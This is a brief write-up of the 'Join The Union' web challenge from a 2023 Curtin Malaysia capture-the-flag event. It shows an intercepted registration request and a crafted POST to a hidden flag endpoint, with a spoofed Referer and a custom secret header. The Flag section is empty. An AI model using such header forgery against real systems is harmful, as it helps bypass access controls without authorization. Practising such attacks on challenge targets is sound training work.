# Join The Union

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/3c1fd080-3794-4f17-a84d-c587a2f7de29)

## Solution

For this challange its quite difficult for me but after I attempt many times I gain the flag

Soo first what I need its to intercept the register form

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/d19cfb0d-4d9f-4e69-a930-b9aefc7999f6)

From here we got secret directory soo I try to go there first time but error appear soo I need to modified my request 😊 so after I fix I got this 

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/66afc040-e204-4cd0-b19a-845a759691fc)

Basically at the login form it has appear `/path` so from that we modify it to request to get the flag

```
POST /g3t_53cR3t_fl4g HTTP/1.1
Host: curtinctfmy-1946797319.ap-southeast-2.elb.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://curtinctfmy-1946797319.ap-southeast-2.elb.amazonaws.com
Connection: close
53c43t: deeca476f2209104fe972a5ae37fd7bb5ad0ae30 (remove cookie and set this)
Referer: https://www.hackerman.play (change the refferer)
Upgrade-Insecure-Requests: 1

email=test%40gmail.co&psw=test&psw-repeat=test&remember=on
```

## Flag
